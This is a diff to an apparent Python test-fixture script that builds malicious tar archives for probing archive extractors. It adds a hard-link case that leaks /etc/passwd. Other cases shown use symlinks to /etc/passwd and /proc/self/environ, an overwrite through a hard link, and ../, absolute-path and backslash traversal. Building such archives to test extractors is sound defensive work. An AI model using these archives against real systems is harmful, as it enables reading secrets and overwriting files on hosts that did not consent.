@@ -52,32 +52,42 @@ with tarfile.open("hardlink-slip.tar", "w") as t:
     hardlink(t, "hl", "/tmp/VICTIM.txt")       # hard-link out to an existing file
     file(t, "hl", b"PWNED")                     # write through -> overwrites /tmp/VICTIM.txt
 
-# --- read primitive: symlinks left in the output that point at host files ---
+# --- read primitives: links left in the output that point at host files ---
 
-# 6) exfiltration: no collision, just symlinks that survive extraction. When the
-#    output is later served/read, these leak arbitrary host files.
+# 6) exfiltration via symlink: no collision, just symlinks that survive
+#    extraction. When the output is later served/read, these leak host files.
 with tarfile.open("exfil-slip.tar", "w") as t:
     sym(t, "passwd", "/etc/passwd")
     sym(t, "env", "/proc/self/environ")
     sym(t, "root", "/")
 
+# 7) exfiltration via hard link: a lone hard link, no second entry, no overwrite.
+#    The extracted name shares the target's inode, so reading it back leaks the
+#    file even where symlinks are refused (a hard link is the file, not a pointer
+#    to follow). Needs the same filesystem as the target, and with Linux
+#    protected_hardlinks an extractor that owns or can write it, in practice one
+#    running as root. A hard link can't point at a dir or a procfs file, so the
+#    realistic target is a regular file like /etc/passwd.
+with tarfile.open("hardlink-exfil-slip.tar", "w") as t:
+    hardlink(t, "passwd", "/etc/passwd")
+
 # --- baseline write traversal (no link needed) ---
 
-# 7) plain ../ path traversal
+# 8) plain ../ path traversal
 with tarfile.open("dotdot-slip.tar", "w") as t:
     file(t, "../../../../../../tmp/PWNED.txt", b"x")
 
-# 8) absolute path (extractor that doesn't strip a leading "/")
+# 9) absolute path (extractor that doesn't strip a leading "/")
 with tarfile.open("abs-slip.tar", "w") as t:
     file(t, "/tmp/PWNED.txt", b"x")
 
-# 9) Windows backslash traversal (sanitizer that only splits on "/")
+# 10) Windows backslash traversal (sanitizer that only splits on "/")
 with tarfile.open("backslash-slip.tar", "w") as t:
     file(t, "..\\..\\..\\..\\..\\..\\tmp\\PWNED.txt", b"x")
 
 # --- permission annoyance: a read-only file that resists deletion ---
 
-# 10) read-only (0444) file. `rm` prompts "remove write-protected file?" and
+# 11) read-only (0444) file. `rm` prompts "remove write-protected file?" and
 #     needs -f; deletion still depends on the parent dir being writable. This is
 #     the closest an archive can get to chattr +i — it is NOT kernel-enforced.
 with tarfile.open("readonly-slip.tar", "w") as t:
